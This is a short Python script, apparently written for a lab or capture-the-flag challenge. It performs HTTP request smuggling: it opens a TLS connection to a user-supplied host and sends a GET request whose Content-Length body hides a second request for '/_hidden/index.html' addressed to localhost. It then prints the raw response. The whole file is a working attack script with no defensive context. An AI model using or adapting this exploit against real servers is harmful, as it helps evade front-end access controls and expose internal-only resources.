#!/usr/bin/python

from lib.EasySSL import EasySSL
from datetime import datetime
def main():
    # Get the website URL from the user
    website_url = input("Enter the website URL (e.g., https://example.com): ")

    # Extract the host and port from the URL
    if website_url.startswith("https://"):
        website_url = website_url[len("https://"):]

    if "/" in website_url:
        host, path = website_url.split("/", 1)
        path = "/" + path
    else:
        host = website_url
        path = "/"

    # Create an instance of the EasySSL class
    ssl_client = EasySSL(SSLFlag=True)

    try:
        # Connect to the server
        ssl_client.connect(host,443,100000000)
        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 56\r\n\r\nGET /_hidden/index.html HTTP/1.1\r\nHost: localhost\r\n\r\n"
        ssl_client.send(request.encode())
        start_time = datetime.now()
        response = ssl_client.recv_nb(100000000)
        end_time = datetime.now()
        print("the lenght is: ",len(response))
        for i in range(len(response)):
            print("Data : of ",i," is ",response[i])
        for i in response:
            print(chr(i),end="")
        print(response[1])
        ssl_client.close()
    finally:
        # Close the connection when done
        ssl_client.close()
if __name__ == "__main__":
    main()
